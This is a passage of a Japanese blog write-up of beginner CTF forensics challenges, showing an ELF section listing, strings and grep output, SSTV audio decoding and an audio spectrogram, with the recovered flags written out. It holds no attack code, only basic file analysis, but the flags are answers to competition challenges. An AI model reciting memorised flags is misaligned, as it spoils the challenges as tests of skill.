+drwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf <span style="color:#ae81ff">8192</span> Mar  <span style="color:#ae81ff">9</span> 17:23 .
+drwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">9</span> 17:23 ..
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf    <span style="color:#ae81ff">0</span> Feb <span style="color:#ae81ff">28</span> 07:10 .bss
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">76</span> Feb <span style="color:#ae81ff">28</span> 07:10 .comment
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">16</span> Feb <span style="color:#ae81ff">28</span> 07:10 .data
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">480</span> Feb <span style="color:#ae81ff">28</span> 07:10 .dynamic
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">157</span> Feb <span style="color:#ae81ff">28</span> 07:10 .dynstr
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">192</span> Feb <span style="color:#ae81ff">28</span> 07:10 .dynsym
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">216</span> Feb <span style="color:#ae81ff">28</span> 07:10 .eh_frame
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">52</span> Feb <span style="color:#ae81ff">28</span> 07:10 .eh_frame_hdr
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">13</span> Feb <span style="color:#ae81ff">28</span> 07:10 .fini
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf    <span style="color:#ae81ff">8</span> Feb <span style="color:#ae81ff">28</span> 07:10 .fini_array
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">28</span> Feb <span style="color:#ae81ff">28</span> 07:10 .gnu.hash
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">16</span> Feb <span style="color:#ae81ff">28</span> 07:10 .gnu.version
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">48</span> Feb <span style="color:#ae81ff">28</span> 07:10 .gnu.version_r
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">40</span> Feb <span style="color:#ae81ff">28</span> 07:10 .got
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">40</span> Feb <span style="color:#ae81ff">28</span> 07:10 .got.plt
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">27</span> Feb <span style="color:#ae81ff">28</span> 07:10 .init
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf    <span style="color:#ae81ff">8</span> Feb <span style="color:#ae81ff">28</span> 07:10 .init_array
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">28</span> Feb <span style="color:#ae81ff">28</span> 07:10 .interp
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">32</span> Feb <span style="color:#ae81ff">28</span> 07:10 .note.ABI-tag
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">36</span> Feb <span style="color:#ae81ff">28</span> 07:10 .note.gnu.build-id
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf    <span style="color:#ae81ff">0</span> Feb <span style="color:#ae81ff">28</span> 07:10 NULL
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">48</span> Feb <span style="color:#ae81ff">28</span> 07:10 .plt
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">192</span> Feb <span style="color:#ae81ff">28</span> 07:10 .rela.dyn
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf   <span style="color:#ae81ff">48</span> Feb <span style="color:#ae81ff">28</span> 07:10 .rela.plt
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf    <span style="color:#ae81ff">4</span> Feb <span style="color:#ae81ff">28</span> 07:10 .rodata
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">259</span> Feb <span style="color:#ae81ff">28</span> 07:10 .shstrtab
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">558</span> Feb <span style="color:#ae81ff">28</span> 07:10 .strtab
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf <span style="color:#ae81ff">1560</span> Feb <span style="color:#ae81ff">28</span> 07:10 .symtab
+-rwxrwx--- <span style="color:#ae81ff">1</span> root vboxsf  <span style="color:#ae81ff">549</span> Feb <span style="color:#ae81ff">28</span> 07:10 .text
+</code></pre></div><p><code>.text</code>が怪しいので中身を見てみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/_Griffith_Observatory.png.extracted/hidden_binary# strings .text
+u3UH
+Ah, you H
+found meH
+utflag<span style="color:#f92672">{</span>2H
+fbe9adc2H
+ad89c71dH
+a48cabe9H
+0a121c0<span style="color:#f92672">}</span>H
+<span style="color:#f92672">[</span><span style="color:#f92672">]</span>A<span style="color:#ae81ff">\A</span><span style="color:#f92672">]</span>A^A_
+</code></pre></div><p>これはフラグなんでしょうか？</p>
+<p>末尾のHを消して提出したら通りました！！</p>
+<p><code>utflag{2fbe9adc2ad89c71da48cabe90a121c0}</code></p>
+<h2 id="1-frame-per-minute-forensics-50pt">1 Frame per Minute (Forensics, 50pt)</h2>
+<p>問題ファイル: <code>signals.wav</code></p>
+<p>音声ファイルを聴いてみると、ピーピー鳴っているのが分かります。</p>
+<p>おそらく何かの信号でしょう。</p>
+<p>問題文に<code>SSTV</code>という単語があったので調べてみるとSlow Scan TeleVisionという通信方式であることが分かります。</p>
+<p>TeleVisionという名の通り、映像データに変換することができます。</p>
+<p>どうやらpicoCTFにも同じような問題があったらしく、<a href="https://tsalvia.hatenablog.com/entry/2019/10/12/053834">この方</a>のwriteupが見つかりました。</p>
+<p>上記リンクを参考に、<a href="http://users.belgacom.net/hamradio/rxsstv.htm">このツール</a>を使って音声を映像に変換しました。</p>
+<p>Windows10であれば、[サウンドの設定]-&gt;[入力]-&gt;[ステレオミキサー]と設定すると、PCで再生した音声をそのままソフトに読み込ませることができます。</p>
+<p>フラグが出てきました！！</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/76197984-7f2f9b00-6230-11ea-9084-ff28f6282285.PNG" alt="signals"></p>
+<h2 id="basics-forensics-forensics-50pt">[basics] forensics (Forensics, 50pt)</h2>
+<p>問題ファイル: <code>secret.jpeg</code></p>
+<p>画像ビューワで開きましたが、上手く画像が表示されません。</p>
+<p>おそらく中身は別ファイルなのでしょう。</p>
+<p><code>strings</code>コマンドで中身を見ると、普通に文章が書かれていました。</p>
+<p><code>grep</code>コマンドで<code>flag</code>と書かれた行のみ抽出した結果、フラグが出てきました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share# strings secret.jpeg | grep flag
+utflag<span style="color:#f92672">{</span>fil3_ext3nsi0ns_4r3nt_r34l<span style="color:#f92672">}</span>
+flagellation. The boor replied that he was flogging him because he was
+flagrant injustice to their great friendship in seeking circuitous
+with the white flag of peace, the little bundle. It was dropped, and I
+with royal flags coming along the road they were travelling; and
+three small flags, which led him to conclude it must be carrying
+By this time the cart with the flags had come up, unattended by anyone
+What cart is this? What have you got in it? What flags are those?
+a present to his Majesty; and the flags are our lord the King
+near enough to see distinctly the flags, make out the colours and
+the squirely flagellation shall have been completed, the white dove
+been kept up so far begin to flag.
+flagging energies were revived. Out of pure vexation he remained
+flag-stone over it; <span style="color:#66d9ef">for</span> I would have you know, Se
+flagrant offence. With this permission the youth began in these words.
+</code></pre></div><p><code>utflag{fil3_ext3nsi0ns_4r3nt_r34l}</code></p>
+<h2 id="spectre-forensics-50pt">Spectre (Forensics, 50pt)</h2>
+<p>問題ファイル: <code>song.wav</code></p>
+<p><code>song.wav</code>という名前なので歌が聴こえると思いきや、ジーという音のみ。</p>
+<p><code>Audacity</code>という音声解析ツールを使って解析していきます。</p>
+<p>問題名がSpectreなので音声のスペクトルを表示させたところ、フラグが現れました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/76198027-98d0e280-6230-11ea-8d64-da71e53d132e.PNG" alt="song"></p>
+<h2 id="sanity-check-misc-1pt">Sanity Check (Misc, 1pt)</h2>
+<p>問題文に書かれているフラグを入れるだけです。</p>
+<p><code>utflag{this_is_the_flag}</code></p>
+<h2 id="感想">感想</h2>
+<p>CTFは一人でもくもくとやるのも良いですが、みんなで議論しながら解くのも面白いですね。
+50ptの問題しか解けなかったのが悔やまれますが&hellip;</p>
+<p>来週の某CTFをやってみよう会にてリベンジします。</p>
+
+			</div>
+		</div>
+	</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+			<a href="#top">Top</a>
+		</div>
+		
+		
+		<p id="copyright">
+			© Copyright 2020 kuzushiki
+		</p>
+		
+	</body>
+</html>
+
